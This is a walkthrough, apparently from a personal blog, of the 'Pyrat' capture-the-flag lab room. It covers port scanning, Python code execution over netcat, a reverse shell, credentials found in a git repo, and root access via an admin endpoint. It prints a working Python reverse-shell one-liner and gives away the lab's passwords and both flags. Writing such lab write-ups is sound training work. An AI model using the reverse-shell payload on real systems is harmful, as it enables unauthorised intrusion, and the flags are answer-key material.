---
Title: CTF Walkthrough 4
categories: [CTF, CTF_walkthrough]
tags: [CTF]
---
"<span style="color:yellow">*Becoming a hacker will take intelligence, practice, dedication, and hard work. Therefore, you have to learn to distrust attitude and respect competence of every kind.*</span>"


![cover](/pictures/SWS_pictures/write_up/pyrat/cover.png)

### Room Information
- Room Name: Pyrat
- Difficulty Level: Easy
- Room type: Challenges(CTF)

![cover](/pictures/SWS_pictures/write_up/pyrat/machine.png)

### Reconnaissance
![cover](/pictures/SWS_pictures/write_up/pyrat/info.png)

Let’s run nmap and check what ports are open.

![cover](/pictures/SWS_pictures/write_up/pyrat/nmap.png)

I discovered 2 open ports: 22(ssh) and 8000(SimpleHTTP/0.6 Python/3.11.2). let’s check the website with port 8000.

![cover](/pictures/SWS_pictures/write_up/pyrat/website.png)

It shows try more basic connection, meaning try netcat.

![cover](/pictures/SWS_pictures/write_up/pyrat/netcat.png)

Whichever method I use is not defined. This error is related to python. I can run that basic python script since simpleHTTP server is running let’s try python code execution.

![cover](/pictures/SWS_pictures/write_up/pyrat/pycode.png)

Search for exploiting python code execution in web

![cover](/pictures/SWS_pictures/write_up/pyrat/norespone.png)

No response so try with eval() function.

![cover](/pictures/SWS_pictures/write_up/pyrat/invalid.png)

It showed an invalid syntax error, which means our code was interpreted with python.

![cover](/pictures/SWS_pictures/write_up/pyrat/wwwdata.png)

We got code execution as www-data. Now let’s try to get the reverse shell. For that search reverse shell cheat sheet. 

![cover](/pictures/SWS_pictures/write_up/pyrat/cheatsheet.png)

From the ipv4, copy the second line, modify the ip and port number as yours, and use execl() function. The command will look like the following:

exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")')

Before running this command we have to start nc.

![cover](/pictures/SWS_pictures/write_up/pyrat/exec.png)

![cover](/pictures/SWS_pictures/write_up/pyrat/connected.png)

Run this command: python3 -c 'import pty;pty.spawn("/bin/bash")'

### Now Let’s get to the User. 

![cover](/pictures/SWS_pictures/write_up/pyrat/search.png)

We don’t have permission to ‘think’ folder but found a git repo on /opt/dev directory. 

![cover](/pictures/SWS_pictures/write_up/pyrat/git.png)

When the credential for the user ‘think’.

![cover](/pictures/SWS_pictures/write_up/pyrat/cred.png)

Username: think <br>
Password: TH1NKINGPirate$


With those credentials let’s login to ssh.

![cover](/pictures/SWS_pictures/write_up/pyrat/think.png)

![cover](/pictures/SWS_pictures/write_up/pyrat/user.png)

Finally, boom…..we got the user flag. 

### Privilege Escalation
The next task is to get the root.txt flag. It isn’t as easy as I thought.  User think can’t run sudo on the pyrat machine.

![cover](/pictures/SWS_pictures/write_up/pyrat/su.png)

If that is the case we need to find different way. So let’s use git repo. Earlier we could run it. Let’s run from think.

![cover](/pictures/SWS_pictures/write_up/pyrat/log.png)

![cover](/pictures/SWS_pictures/write_up/pyrat/diff.png)

There is a ‘get_this_enpoint’ function, let’s check that shell function.

![cover](/pictures/SWS_pictures/write_up/pyrat/shell.png)

Shell function also gives access as www-data that we already have. So let’s write a python script to  find some_endpoint

![cover](/pictures/SWS_pictures/write_up/pyrat/script.png)

Now let’s run it

![cover](/pictures/SWS_pictures/write_up/pyrat/admin.png)

admin is one of the endpoint, so let’s find the password for admin.

![cover](/pictures/SWS_pictures/write_up/pyrat/password.png)

![cover](/pictures/SWS_pictures/write_up/pyrat/pass.png)

We got the password for admin that is abc123. 

Next step is start netcat and type admin and then password

![cover](/pictures/SWS_pictures/write_up/pyrat/root.png)

Now I have root access. 

![cover](/pictures/SWS_pictures/write_up/pyrat/rootflag.png)

Finally, I got the root.txt


### Flag Captured
user.txt flag: 996bdb1f619a68361417cabca5454705<br>
root.txt flag:  ba5ed03e9e74bb98054438480165e221
